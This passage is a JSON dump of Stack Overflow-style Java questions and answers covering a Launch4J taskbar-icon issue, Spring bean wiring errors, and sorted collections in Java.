alt=\"enter image description here\" /></a></p>\n<hr />\n<p>I expect there should be only 1 icon. This is how the pinned app Netbeans look like, if it is launched.</p>\n<h2>Only 1 icon appears in Taskbar. 1 icon for both launcher and current active running app</h2>\n<p><a href=\"https://i.stack.imgur.com/jvgLa.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/jvgLa.png\" alt=\"enter image description here\" /></a></p>\n<hr />\n<p><strong>Do you have idea what goes wrong with my Java Swing application deployment? Why 2 icons are being shown on the taskbar?</strong></p>\n<p>I am using Launch4J (<a href=\"http://launch4j.sourceforge.net/\" rel=\"nofollow noreferrer\">http://launch4j.sourceforge.net/</a>) to build the EXE via the following XML file.</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;launch4jConfig&gt;\n  &lt;dontWrapJar&gt;false&lt;/dontWrapJar&gt;\n  &lt;headerType&gt;gui&lt;/headerType&gt;\n  &lt;jar&gt;c:\\yocto\\jstock\\dist\\jstock.jar&lt;/jar&gt;\n  &lt;outfile&gt;c:\\yocto\\jstock\\installer\\windows\\jstock.exe&lt;/outfile&gt;\n  &lt;errTitle&gt;&lt;/errTitle&gt;\n  &lt;cmdLine&gt;&lt;/cmdLine&gt;\n  &lt;chdir&gt;&lt;/chdir&gt;\n  &lt;priority&gt;normal&lt;/priority&gt;\n  &lt;downloadUrl&gt;http://java.com/download&lt;/downloadUrl&gt;\n  &lt;supportUrl&gt;&lt;/supportUrl&gt;\n  &lt;stayAlive&gt;false&lt;/stayAlive&gt;\n  &lt;restartOnCrash&gt;false&lt;/restartOnCrash&gt;\n  &lt;manifest&gt;&lt;/manifest&gt;\n  &lt;icon&gt;c:\\yocto\\jstock\\installer\\windows\\chart.ico&lt;/icon&gt;\n  &lt;jre&gt;\n    &lt;path&gt;&lt;/path&gt;\n    &lt;bundledJre64Bit&gt;false&lt;/bundledJre64Bit&gt;\n    &lt;bundledJreAsFallback&gt;false&lt;/bundledJreAsFallback&gt;\n    &lt;minVersion&gt;1.7.0&lt;/minVersion&gt;\n    &lt;maxVersion&gt;&lt;/maxVersion&gt;\n    &lt;jdkPreference&gt;preferJre&lt;/jdkPreference&gt;\n    &lt;runtimeBits&gt;64/32&lt;/runtimeBits&gt;\n    &lt;initialHeapSize&gt;64&lt;/initialHeapSize&gt;\n    &lt;maxHeapSize&gt;512&lt;/maxHeapSize&gt;\n    &lt;opt&gt;-Dsun.java2d.dpiaware=false&lt;/opt&gt;\n  &lt;/jre&gt;\n  &lt;versionInfo&gt;\n    &lt;fileVersion&gt;1.1.8.5&lt;/fileVersion&gt;\n    &lt;txtFileVersion&gt;1.1.8.5&lt;/txtFileVersion&gt;\n    &lt;fileDescription&gt;JStock - Stock Market Software&lt;/fileDescription&gt;\n    &lt;copyright&gt;Yan Cheng Cheok &amp;lt;yancheng.cheok@gmail.com&amp;gt;&lt;/copyright&gt;\n    &lt;productVersion&gt;1.1.8.5&lt;/productVersion&gt;\n    &lt;txtProductVersion&gt;1.1.8.5&lt;/txtProductVersion&gt;\n    &lt;productName&gt;JStock - Stock Market Software&lt;/productName&gt;\n    &lt;companyName&gt;Yan Cheng Cheok &amp;lt;yancheng.cheok@gmail.com&amp;gt;&lt;/companyName&gt;\n    &lt;internalName&gt;jstock&lt;/internalName&gt;\n    &lt;originalFilename&gt;jstock.exe&lt;/originalFilename&gt;\n    &lt;trademarks&gt;&lt;/trademarks&gt;\n    &lt;language&gt;ENGLISH_US&lt;/language&gt;\n  &lt;/versionInfo&gt;\n&lt;/launch4jConfig&gt;\n</code></pre>\n"},{"tags":["java","spring-boot"],"answers":[{"tags":[],"owner":{"account_id":23803283,"reputation":126,"user_id":17813175,"display_name":"Mohaideen Samsudeen"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1642484692,"creation_date":1642260941,"answer_id":70722871,"question_id":70722661,"body_markdown":"You can try with below change in DemoApplication class. Instead of passing MileageFeeController.class to SpringApplication.run, pass DemoApplication.class\r\n\r\n```\r\n@SpringBootApplication\r\n@ComponentScan\r\npublic class DemoApplication {\r\n\tpublic static void main(String[] args) {\r\n\t\tSpringApplication.run(DemoApplication.class, args);\r\n\t}\r\n}\r\n\r\n```\r\n\r\nAs you mentioned you have to MileageFeeController.mileageFee method, you should run SpringBoot application as CommandLineRunner as below.\r\n\r\nCommandLineRunner has a run method which you can use to trigger MileageFeeController.mileageFee method\r\n\r\n```\r\n@SpringBootApplication\r\n@ComponentScan\r\npublic class DemoApplication implements CommandLineRunner {\r\n\r\n\t@Autowired\r\n\tMileageFeeController feeController;\r\n\r\n\tpublic static void main(String[] args) {\r\n\t\tSpringApplication.run(DemoApplication.class, args);\r\n\t}\r\n\r\n\t@Override\r\n\tpublic void run(String... args) {\r\n\t\tSystem.out.println(feeController.mileageFee(5));\r\n\t}\r\n}\r\n\r\n```","title":"when running spring Boot application getting required a bean of type that could not be found","body":"<p>You can try with below change in DemoApplication class. Instead of passing MileageFeeController.class to SpringApplication.run, pass DemoApplication.class</p>\n<pre><code>@SpringBootApplication\n@ComponentScan\npublic class DemoApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(DemoApplication.class, args);\n    }\n}\n\n</code></pre>\n<p>As you mentioned you have to MileageFeeController.mileageFee method, you should run SpringBoot application as CommandLineRunner as below.</p>\n<p>CommandLineRunner has a run method which you can use to trigger MileageFeeController.mileageFee method</p>\n<pre><code>@SpringBootApplication\n@ComponentScan\npublic class DemoApplication implements CommandLineRunner {\n\n    @Autowired\n    MileageFeeController feeController;\n\n    public static void main(String[] args) {\n        SpringApplication.run(DemoApplication.class, args);\n    }\n\n    @Override\n    public void run(String... args) {\n        System.out.println(feeController.mileageFee(5));\n    }\n}\n\n</code></pre>\n"}],"owner":{"account_id":23949168,"reputation":21,"user_id":17941060,"display_name":"jitendra kumar"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":165,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":1,"score":2,"last_activity_date":1642484692,"creation_date":1642259468,"question_id":70722661,"body_markdown":"```java\r\n@SpringBootApplication\r\n@ComponentScan\r\npublic class DemoApplication {\r\n  public static void main(String[] args) {\r\n    SpringApplication.run(MileageFeeController.class, args);\t\r\n  }\r\n}\r\n```\r\n\r\n```java\r\n@Controller\r\npublic class MileageFeeController { \r\n  @Autowired \r\n  MileageFeeCalculator calc;\r\n\r\n  public float mileageFee( int miles) {\r\n    System.out.println(&quot;Helloe&quot;);\r\n    return calc.mileageCharge(miles);\r\n  }\r\n}\r\n```\r\n\r\n```java\r\n@Component\r\npublic class MileageFeeCalculator {\r\n  @Autowired\r\n  private MileageRateService rateService; \r\n\r\n  public float mileageCharge(int miles) {\r\n    return (miles * rateService.ratePerMile());\r\n  }\r\n}\r\n```\r\n\r\n```java\r\n@Component\r\npublic class MileageRateService {\r\n  public float ratePerMile() {\r\n    return 0.565f;\r\n  }\r\n}\r\n```\r\n\r\nWhile executing above code getting below errors\r\n```none\r\ncom.demo.DemoApplication : Starting DemoApplication using Java 17 on N13115 with PID 9336 (D:\\Spring Tool\\SpringWorkSpace\\Demo\\target\\classes started by jitendra2.k in D:\\Spring Tool\\SpringWorkSpace\\Demo)\r\ncom.demo.DemoApplication : No active profile set, falling back to default profiles: default\r\ns.c.a.AnnotationConfigApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &#39;mileageFeeController&#39;: Unsatisfied dependency expressed through field &#39;calc&#39;; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type &#39;com.demo.MileageFeeCalculator&#39; available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\r\n2022-01-15 20:28:39.643 ERROR 9336 --- [main] o.s.b.d.LoggingFailureAnalysisReporter: \r\n\r\n***************************\r\nAPPLICATION FAILED TO START\r\n***************************\r\n\r\nDescription:\r\n\r\nField calc in com.demo.MileageFeeController required a bean of type &#39;com.demo.MileageFeeCalculator&#39; that could not be found.\r\n\r\nThe injection point has the following annotations:\r\n\t- @org.springframework.beans.factory.annotation.Autowired(required=true)\r\nAction:\r\n\r\nConsider defining a bean of type &#39;com.demo.MileageFeeCalculator&#39; in your configuration.\r\n```","title":"when running spring Boot application getting required a bean of type that could not be found","body":"<pre class=\"lang-java prettyprint-override\"><code>@SpringBootApplication\n@ComponentScan\npublic class DemoApplication {\n  public static void main(String[] args) {\n    SpringApplication.run(MileageFeeController.class, args);    \n  }\n}\n</code></pre>\n<pre class=\"lang-java prettyprint-override\"><code>@Controller\npublic class MileageFeeController { \n  @Autowired \n  MileageFeeCalculator calc;\n\n  public float mileageFee( int miles) {\n    System.out.println(&quot;Helloe&quot;);\n    return calc.mileageCharge(miles);\n  }\n}\n</code></pre>\n<pre class=\"lang-java prettyprint-override\"><code>@Component\npublic class MileageFeeCalculator {\n  @Autowired\n  private MileageRateService rateService; \n\n  public float mileageCharge(int miles) {\n    return (miles * rateService.ratePerMile());\n  }\n}\n</code></pre>\n<pre class=\"lang-java prettyprint-override\"><code>@Component\npublic class MileageRateService {\n  public float ratePerMile() {\n    return 0.565f;\n  }\n}\n</code></pre>\n<p>While executing above code getting below errors</p>\n<pre class=\"lang-none prettyprint-override\"><code>com.demo.DemoApplication : Starting DemoApplication using Java 17 on N13115 with PID 9336 (D:\\Spring Tool\\SpringWorkSpace\\Demo\\target\\classes started by jitendra2.k in D:\\Spring Tool\\SpringWorkSpace\\Demo)\ncom.demo.DemoApplication : No active profile set, falling back to default profiles: default\ns.c.a.AnnotationConfigApplicationContext : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'mileageFeeController': Unsatisfied dependency expressed through field 'calc'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.demo.MileageFeeCalculator' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)}\n2022-01-15 20:28:39.643 ERROR 9336 --- [main] o.s.b.d.LoggingFailureAnalysisReporter: \n\n***************************\nAPPLICATION FAILED TO START\n***************************\n\nDescription:\n\nField calc in com.demo.MileageFeeController required a bean of type 'com.demo.MileageFeeCalculator' that could not be found.\n\nThe injection point has the following annotations:\n    - @org.springframework.beans.factory.annotation.Autowired(required=true)\nAction:\n\nConsider defining a bean of type 'com.demo.MileageFeeCalculator' in your configuration.\n</code></pre>\n"},{"tags":["java","spring","spring-boot","javabeans"],"answers":[{"tags":[],"owner":{"account_id":3524496,"reputation":168,"user_id":2945996,"display_name":"rimesc"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642453762,"creation_date":1642453762,"answer_id":70747534,"question_id":70747305,"body_markdown":"According to the [javadoc](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/annotation/AnnotationConfigApplicationContext.html) for `AnnotationConfigApplicationContext`, the constructor that takes a string argument expects the name of a *package* to scan for configuration files.  You can alternatively pass one or more class objects or a factory.\r\n\r\nIn your case, Spring will be expecting to find a package called `com.springinaction.knights.config.KnightBeans.class`.  Instead, you probably wanted to pass the class itself, without the double quotes:\r\n\r\n```java\r\nAnnotationConfigApplicationContext context =\r\n    new AnnotationConfigApplicationContext(com.springinaction.knights.config.KnightBeans.class);\r\n```\r\n\r\nYou could also do\r\n\r\n```java\r\nAnnotationConfigApplicationContext context =\r\n    new AnnotationConfigApplicationContext(&quot;com.springinaction.knights.config&quot;);\r\n```\r\n\r\nto scan all the configs in the `config` package.","title":"Spring java annotation-based config won&#39;t work, but xml-based config does?","body":"<p>According to the <a href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/annotation/AnnotationConfigApplicationContext.html\" rel=\"nofollow noreferrer\">javadoc</a> for <code>AnnotationConfigApplicationContext</code>, the constructor that takes a string argument expects the name of a <em>package</em> to scan for configuration files.  You can alternatively pass one or more class objects or a factory.</p>\n<p>In your case, Spring will be expecting to find a package called <code>com.springinaction.knights.config.KnightBeans.class</code>.  Instead, you probably wanted to pass the class itself, without the double quotes:</p>\n<pre class=\"lang-java prettyprint-override\"><code>AnnotationConfigApplicationContext context =\n    new AnnotationConfigApplicationContext(com.springinaction.knights.config.KnightBeans.class);\n</code></pre>\n<p>You could also do</p>\n<pre class=\"lang-java prettyprint-override\"><code>AnnotationConfigApplicationContext context =\n    new AnnotationConfigApplicationContext(&quot;com.springinaction.knights.config&quot;);\n</code></pre>\n<p>to scan all the configs in the <code>config</code> package.</p>\n"},{"tags":[],"owner":{"account_id":15319993,"reputation":11,"user_id":11052773,"display_name":"poorwa kesharwani"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642484655,"creation_date":1642484655,"answer_id":70750812,"question_id":70747305,"body_markdown":"When you are fetching the bean using context.getBean() in that you need to pass the method name of the bean so that spring gets to know what is the bean needs to inject.\r\n\r\n    package com.springinaction.knights;\r\n\r\n    import org.springframework.context.annotation.AnnotationConfigApplicationContext;\r\n\r\n    public class KnightMain {\r\n\r\n    public static void main(String[] args) throws Exception {\r\n      AnnotationConfigApplicationContext context =\r\n            new AnnotationConfigApplicationContext(\r\n                  &quot;full class path&quot;);\r\n      Knight knight = context.getBean(&quot;knight&quot;,Knight.class);\r\n      knight.embarkOnQuest();\r\n      context.close();\r\n    }\r\n\r\n    }\r\nAnd in  AnnotationConfigApplicationContext  ","title":"Spring java annotation-based config won&#39;t work, but xml-based config does?","body":"<p>When you are fetching the bean using context.getBean() in that you need to pass the method name of the bean so that spring gets to know what is the bean needs to inject.</p>\n<pre><code>package com.springinaction.knights;\n\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\n\npublic class KnightMain {\n\npublic static void main(String[] args) throws Exception {\n  AnnotationConfigApplicationContext context =\n        new AnnotationConfigApplicationContext(\n              &quot;full class path&quot;);\n  Knight knight = context.getBean(&quot;knight&quot;,Knight.class);\n  knight.embarkOnQuest();\n  context.close();\n}\n\n}\n</code></pre>\n<p>And in  AnnotationConfigApplicationContext</p>\n"}],"owner":{"account_id":21216317,"reputation":15,"user_id":15603874,"display_name":"ChunkyLover53"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1029,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70747534,"answer_count":2,"score":0,"last_activity_date":1642484655,"creation_date":1642452217,"question_id":70747305,"body_markdown":"I&#39;ve been following along with Chapter 1 of the book &quot;Spring in Action&quot;, 4th Edition.\r\nThe first chapter has a simple example demonstrating Dependency Injection and bean wiring.\r\n(https://livebook.manning.com/book/spring-in-action-fourth-edition/chapter-1)\r\n\r\nI&#39;ve copied the code into intelliJ, but had to make my own project structure. \r\nI&#39;m having some trouble with Application Contexts. If I use an xml file along with ClassPathXmlApplicationContext, it works fine. However, when I tried using a .java file to declare my beans, and AnnotationConfigApplicationContext, it wouldn&#39;t work, giving me the following error message:\r\n```\r\norg.springframework.context.annotation.AnnotationConfigApplicationContext prepareRefresh\r\nINFO: Refreshing org.springframework.context.annotation.AnnotationConfigApplicationContext@41a4555e: startup date [Mon Jan 17 20:22:09 GMT 2022]; root of context hierarchy\r\nException in thread &quot;main&quot; org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type [com.springinaction.knights.Knight] is defined\r\n\tat org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:319)\r\n\tat org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:987)\r\n\tat com.springinaction.knights.KnightMain.main(KnightMain.java:12)\r\n```\r\n\r\nThe 2 relevant classes are shown below:\r\n\r\nsrc/main/java/com/springinaction/knights/config/KnightBeans.java :\r\n```\r\npackage com.springinaction.knights.config;\r\n\r\nimport org.springframework.context.annotation.Bean;\r\nimport org.springframework.context.annotation.Configuration;\r\n\r\nimport com.springinaction.knights.BraveKnight;\r\nimport com.springinaction.knights.Knight;\r\nimport com.springinaction.knights.Quest;\r\nimport com.springinaction.knights.SlayDragonQuest;\r\n\r\n@Configuration\r\npublic class KnightBeans\r\n{\r\n   @Bean\r\n   public Knight knight() {\r\n      return new BraveKnight(quest());\r\n   }\r\n\r\n   @Bean\r\n   public Quest quest() {\r\n      return new SlayDragonQuest(System.out);\r\n   }\r\n\r\n}\r\n```\r\n\r\nsrc\\main\\java\\com\\springinaction\\knights\\KnightMain.java :\r\n```\r\npackage com.springinaction.knights;\r\n\r\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\r\n\r\npublic class KnightMain {\r\n\r\n   public static void main(String[] args) throws Exception {\r\n      AnnotationConfigApplicationContext context =\r\n            new AnnotationConfigApplicationContext(\r\n                  &quot;com.springinaction.knights.config.KnightBeans.class&quot;);\r\n      Knight knight = context.getBean(Knight.class);\r\n      knight.embarkOnQuest();\r\n      context.close();\r\n   }\r\n\r\n}\r\n```\r\n\r\nAdditional info: \r\nI have created interfaces for Knight and Quest, which are implemented by the BraveKnight and SlayDragonQuest classes. All of these, as well as KnightMain.java, reside in the &quot;knights&quot; package.\r\nKnightBeans.java resides in the subpackage called config.\r\n\r\nI&#39;ve tried putting various classpaths in  new AnnotationConfigApplicationContext(), but always get the same error.\r\n\r\nCan anyone explain why this is?\r\n","title":"Spring java annotation-based config won&#39;t work, but xml-based config does?","body":"<p>I've been following along with Chapter 1 of the book &quot;Spring in Action&quot;, 4th Edition.\nThe first chapter has a simple example demonstrating Dependency Injection and bean wiring.\n(<a href=\"https://livebook.manning.com/book/spring-in-action-fourth-edition/chapter-1\" rel=\"nofollow noreferrer\">https://livebook.manning.com/book/spring-in-action-fourth-edition/chapter-1</a>)</p>\n<p>I've copied the code into intelliJ, but had to make my own project structure.\nI'm having some trouble with Application Contexts. If I use an xml file along with ClassPathXmlApplicationContext, it works fine. However, when I tried using a .java file to declare my beans, and AnnotationConfigApplicationContext, it wouldn't work, giving me the following error message:</p>\n<pre><code>org.springframework.context.annotation.AnnotationConfigApplicationContext prepareRefresh\nINFO: Refreshing org.springframework.context.annotation.AnnotationConfigApplicationContext@41a4555e: startup date [Mon Jan 17 20:22:09 GMT 2022]; root of context hierarchy\nException in thread &quot;main&quot; org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type [com.springinaction.knights.Knight] is defined\n    at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:319)\n    at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:987)\n    at com.springinaction.knights.KnightMain.main(KnightMain.java:12)\n</code></pre>\n<p>The 2 relevant classes are shown below:</p>\n<p>src/main/java/com/springinaction/knights/config/KnightBeans.java :</p>\n<pre><code>package com.springinaction.knights.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport com.springinaction.knights.BraveKnight;\nimport com.springinaction.knights.Knight;\nimport com.springinaction.knights.Quest;\nimport com.springinaction.knights.SlayDragonQuest;\n\n@Configuration\npublic class KnightBeans\n{\n   @Bean\n   public Knight knight() {\n      return new BraveKnight(quest());\n   }\n\n   @Bean\n   public Quest quest() {\n      return new SlayDragonQuest(System.out);\n   }\n\n}\n</code></pre>\n<p>src\\main\\java\\com\\springinaction\\knights\\KnightMain.java :</p>\n<pre><code>package com.springinaction.knights;\n\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\n\npublic class KnightMain {\n\n   public static void main(String[] args) throws Exception {\n      AnnotationConfigApplicationContext context =\n            new AnnotationConfigApplicationContext(\n                  &quot;com.springinaction.knights.config.KnightBeans.class&quot;);\n      Knight knight = context.getBean(Knight.class);\n      knight.embarkOnQuest();\n      context.close();\n   }\n\n}\n</code></pre>\n<p>Additional info:\nI have created interfaces for Knight and Quest, which are implemented by the BraveKnight and SlayDragonQuest classes. All of these, as well as KnightMain.java, reside in the &quot;knights&quot; package.\nKnightBeans.java resides in the subpackage called config.</p>\n<p>I've tried putting various classpaths in  new AnnotationConfigApplicationContext(), but always get the same error.</p>\n<p>Can anyone explain why this is?</p>\n"},{"tags":["java","sorting","collections"],"answers":[{"tags":[],"owner":{"account_id":9193,"reputation":343113,"user_id":16883,"accept_rate":83,"display_name":"Michael Borgwardt"},"down_vote_count":2,"up_vote_count":59,"is_accepted":false,"score":57,"last_activity_date":1231243565,"creation_date":1231243565,"answer_id":416278,"question_id":416266,"body_markdown":"TreeMap and TreeSet will give you an iteration over the contents in sorted order. Or you could use an ArrayList and use Collections.sort() to sort it. All those classes are in java.util","title":"Sorted collection in Java","body":"<p>TreeMap and TreeSet will give you an iteration over the contents in sorted order. Or you could use an ArrayList and use Collections.sort() to sort it. All those classes are in java.util</p>\n"},{"tags":[],"owner":{"account_id":9867,"reputation":618181,"user_id":18393,"accept_rate":82,"display_name":"cletus"},"down_vote_count":2,"up_vote_count":14,"is_accepted":false,"score":12,"last_activity_date":1231243602,"creation_date":1231243602,"answer_id":416280,"question_id":416266,"body_markdown":"You want the [SortedSet][1] implementations, namely [TreeSet][2].\r\n\r\n\r\n  [1]: http://java.sun.com/javase/6/docs/api/java/util/SortedSet.html\r\n  [2]: http://java.sun.com/javase/6/docs/api/java/util/TreeSet.html","title":"Sorted collection in Java","body":"<p>You want the <a href=\"http://java.sun.com/javase/6/docs/api/java/util/SortedSet.html\" rel=\"noreferrer\">SortedSet</a> implementations, namely <a href=\"http://java.sun.com/javase/6/docs/api/java/util/TreeSet.html\" rel=\"noreferrer\">TreeSet</a>.</p>\n"},{"tags":[],"owner":{"account_id":18922,"reputation":4064,"user_id":43850,"accept_rate":100,"display_name":"BenM"},"down_vote_count":2,"up_vote_count":14,"is_accepted":false,"score":12,"last_activity_date":1340500609,"creation_date":1231243645,"answer_id":416281,"question_id":416266,"body_markdown":"There are a few options. I&#39;d suggest TreeSet if you don&#39;t want duplicates and the objects you&#39;re inserting are comparable.\r\n\r\nYou can also use the static methods of the Collections class to do this.\r\n\r\nSee [Collections#sort(java.util.List)][1] and [TreeSet][2] for more info.\r\n\r\n\r\n  [1]: http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#sort%28java.util.List%29\r\n  [2]: http://docs.oracle.com/javase/7/docs/api/java/util/TreeSet.html","title":"Sorted collection in Java","body":"<p>There are a few options. I'd suggest TreeSet if you don't want duplicates and the objects you're inserting are comparable.</p>\n\n<p>You can also use the static methods of the Collections class to do this.</p>\n\n<p>See <a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#sort%28java.util.List%29\" rel=\"nofollow noreferrer\">Collections#sort(java.util.List)</a> and <a href=\"http://docs.oracle.com/javase/7/docs/api/java/util/TreeSet.html\" rel=\"nofollow noreferrer\">TreeSet</a> for more info.</p>\n"},{"tags":[],"owner":{"account_id":12120,"reputation":18594,"user_id":23704,"accept_rate":66,"display_name":"Guillaume"},"down_vote_count":2,"up_vote_count":12,"is_accepted":false,"score":10,"last_activity_date":1231243775,"creation_date":1231243775,"answer_id":416289,"question_id":416266,"body_markdown":"If you just want to sort a list, use any kind of [List][1] and use [Collections.sort()][2]. If you want to make sure elements in the list are unique and always sorted, use a [SortedSet][3].\r\n\r\n\r\n  [1]: http://java.sun.com/j2se/1.5.0/docs/api/java/util/List.html\r\n  [2]: http://java.sun.com/j2se/1.5.0/docs/api/java/util/Collections.html#sort(java.util.List)\r\n  [3]: http://java.sun.com/j2se/1.5.0/docs/api/java/util/SortedSet.html","title":"Sorted collection in Java","body":"<p>If you just want to sort a list, use any kind of <a href=\"http://java.sun.com/j2se/1.5.0/docs/api/java/util/List.html\" rel=\"noreferrer\">List</a> and use <a href=\"http://java.sun.com/j2se/1.5.0/docs/api/java/util/Collections.html#sort(java.util.List)\" rel=\"noreferrer\">Collections.sort()</a>. If you want to make sure elements in the list are unique and always sorted, use a <a href=\"http://java.sun.com/j2se/1.5.0/docs/api/java/util/SortedSet.html\" rel=\"noreferrer\">SortedSet</a>.</p>\n"},{"tags":[],"owner":{"account_id":20470,"reputation":21695,"user_id":48933,"accept_rate":90,"display_name":"Neil Coffey"},"down_vote_count":1,"up_vote_count":36,"is_accepted":false,"score":35,"last_activity_date":1231248327,"creation_date":1231248327,"answer_id":416505,"question_id":416266,"body_markdown":"If you want to maintain a **sorted list** which you will **frequently modify** (i.e. a structure which, in addition to being sorted, allows duplicates and whose elements can be efficiently referenced by index), then use an ArrayList but when you need to insert an element, always use **Collections.binarySearch() to determine the index** at which you add a given element. The latter method tells you the index you need to insert at to keep your list in sorted order.","title":"Sorted collection in Java","body":"<p>If you want to maintain a <strong>sorted list</strong> which you will <strong>frequently modify</strong> (i.e. a structure which, in addition to being sorted, allows duplicates and whose elements can be efficiently referenced by index), then use an ArrayList but when you need to insert an element, always use <strong>Collections.binarySearch() to determine the index</strong> at which you add a given element. The latter method tells you the index you need to insert at to keep your list in sorted order.</p>\n"},{"tags":[],"owner":{"account_id":11511,"reputation":9525,"user_id":22227,"accept_rate":62,"display_name":"Martin Probst"},"down_vote_count":20,"up_vote_count":219,"is_accepted":false,"score":199,"last_activity_date":1420818006,"creation_date":1267017714,"answer_id":2326244,"question_id":416266,"body_markdown":"This comes very late, but there is a class in the JDK just for the purpose of having a sorted list. It is named (somewhat out of order with the other `Sorted*` interfaces) &quot;`java.util.PriorityQueue`&quot;. It can sort either `Comparable&lt;?&gt;`s or using a `Comparator`.\r\n\r\nThe difference with a `List` sorted using `Collections.sort(...)` is that this will maintain a partial order at all times, with O(log(n)) insertion performance, by using a heap data structure, whereas inserting in a sorted `ArrayList` will be O(n) (i.e., using binary search and move).\r\n\r\nHowever, unlike a `List`, `PriorityQueue` does not support indexed access (`get(5)`), **the only way to access items in a heap is to take them out, one at a time** (thus the name `PriorityQueue`).","title":"Sorted collection in Java","body":"<p>This comes very late, but there is a class in the JDK just for the purpose of having a sorted list. It is named (somewhat out of order with the other <code>Sorted*</code> interfaces) \"<code>java.util.PriorityQueue</code>\". It can sort either <code>Comparable&lt;?&gt;</code>s or using a <code>Comparator</code>.</p>\n\n<p>The difference with a <code>List</code> sorted using <code>Collections.sort(...)</code> is that this will maintain a partial order at all times, with O(log(n)) insertion performance, by using a heap data structure, whereas inserting in a sorted <code>ArrayList</code> will be O(n) (i.e., using binary search and move).</p>\n\n<p>However, unlike a <code>List</code>, <code>PriorityQueue</code> does not support indexed access (<code>get(5)</code>), <strong>the only way to access items in a heap is to take them out, one at a time</strong> (thus the name <code>PriorityQueue</code>).</p>\n"},{"tags":[],"owner":{"account_id":106097,"reputation":838,"user_id":282778,"display_name":"jtb"},"down_vote_count":1,"up_vote_count":36,"is_accepted":false,"score":35,"last_activity_date":1538082025,"creation_date":1303395674,"answer_id":5745380,"question_id":416266,"body_markdown":"Use Google Guava&#39;s [TreeMultiset][1] class. [Guava][2] has a spectacular collections API.\r\n\r\nOne problem with providing an implementation of List that maintains sorted order is the promise made in the JavaDocs of the `add()` method.\r\n\r\n[1]: https://google.github.io/guava/releases/snapshot/api/docs/index.html?com/google/common/collect/TreeMultiset.html\r\n[2]: https://github.com/google/guava","title":"Sorted collection in Java","body":"<p>Use Google Guava's <a href=\"https://google.github.io/guava/releases/snapshot/api/docs/index.html?com/google/common/collect/TreeMultiset.html\" rel=\"noreferrer\">TreeMultiset</a> class. <a href=\"https://github.com/google/guava\" rel=\"noreferrer\">Guava</a> has a spectacular collections API.</p>\n\n<p>One problem with providing an implementation of List that maintains sorted order is the promise made in the JavaDocs of the <code>add()</code> method.</p>\n"},{"tags":[],"owner":{"account_id":1428508,"reputation":41,"user_id":1351456,"display_name":"Giuseppe"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1335190636,"creation_date":1335188571,"answer_id":10281746,"question_id":416266,"body_markdown":"TreeSet would not work because they do not allow duplicates plus they do not provide method to fetch element at specific position. PriorityQueue would not work because it does not allow fetching elements at specific position which is a basic requirement for a list.\r\nI think you need to implement your own algorithm to maintain a sorted list in Java with O(logn) insert time, unless you do not need duplicates.\r\nMaybe a solution could be using a TreeMap where the key is a subclass of the item overriding the equals method so that duplicates are allowed. ","title":"Sorted collection in Java","body":"<p>TreeSet would not work because they do not allow duplicates plus they do not provide method to fetch element at specific position. PriorityQueue would not work because it does not allow fetching elements at specific position which is a basic requirement for a list.\nI think you need to implement your own algorithm to maintain a sorted list in Java with O(logn) insert time, unless you do not need duplicates.\nMaybe a solution could be using a TreeMap where the key is a subclass of the item overriding the equals method so that duplicates are allowed. </p>\n"},{"tags":[],"owner":{"account_id":1036092,"reputation":8846,"user_id":1043352,"accept_rate":81,"display_name":"Jakub Zaverka"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1335194797,"creation_date":1335194797,"answer_id":10283509,"question_id":416266,"body_markdown":"What you want is a binary search tree. It maintains sorted order while offering logarithmic access for searches, removals and insertions (unless you have a degenerated tree - then it&#39;s linear). It is quite easy to implement and you even can make it implement the List interface, but then the index-access gets complicated.\r\n\r\nSecond approach is to have an ArrayList and then a bubble sort implementation. Because you are inserting or removing one element at a time, the access times for insertions and removals are linear. Searches are logarithmic and index access constant (times can get different for LinkedList). The only code you need is 5, maybe 6 lines of bubble sort.","title":"Sorted collection in Java","body":"<p>What you want is a binary search tree. It maintains sorted order while offering logarithmic access for searches, removals and insertions (unless you have a degenerated tree - then it's linear). It is quite easy to implement and you even can make it implement the List interface, but then the index-access gets complicated.</p>\n\n<p>Second approach is to have an ArrayList and then a bubble sort implementation. Because you are inserting or removing one 